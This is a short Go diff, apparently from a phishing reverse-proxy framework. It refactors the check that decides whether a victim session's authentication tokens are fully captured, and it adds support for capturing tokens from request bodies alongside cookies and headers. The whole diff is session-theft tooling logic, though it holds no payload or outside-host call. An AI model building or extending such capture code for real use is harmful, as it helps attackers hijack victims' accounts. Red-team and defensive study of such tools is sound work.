@@ -64,21 +64,26 @@ func (s *Session) HasRequiredTokens(def *Phishlet) bool {
 		return false
 	}
 	for _, rule := range def.AuthTokens {
-		if rule.Always {
-			continue
-		}
-		switch rule.Type {
-		case TokenTypeCookie:
-			if !s.hasCookieToken(rule) {
-				return false
-			}
-		case TokenTypeHTTPHeader:
-			if rule.Name != nil && !s.hasHTTPToken(rule) {
-				return false
-			}
+		if !rule.Always && !s.hasToken(rule) {
+			return false
 		}
 	}
 	return true
+}
+
+// hasToken dispatches to the type-specific check. Adding a new token type
+// requires only a new has*() method and a case here — HasRequiredTokens is stable.
+// Each leaf method handles its own nil guards on rule fields.
+func (s *Session) hasToken(rule TokenRule) bool {
+	switch rule.Type {
+	case TokenTypeCookie:
+		return s.hasCookieToken(rule)
+	case TokenTypeHTTPHeader:
+		return s.hasHTTPToken(rule)
+	case TokenTypeBody:
+		return s.hasBodyToken(rule)
+	}
+	return false
 }
 
 func (s *Session) hasCookieToken(rule TokenRule) bool {
@@ -119,6 +124,14 @@ func (s *Session) hasHTTPToken(rule TokenRule) bool {
 		}
 	}
 	return false
+}
+
+func (s *Session) hasBodyToken(rule TokenRule) bool {
+	if rule.Name == nil {
+		return false
+	}
+	value, ok := s.BodyTokens[rule.Name.String()]
+	return ok && value != ""
 }
 
 func (s *Session) Complete() {
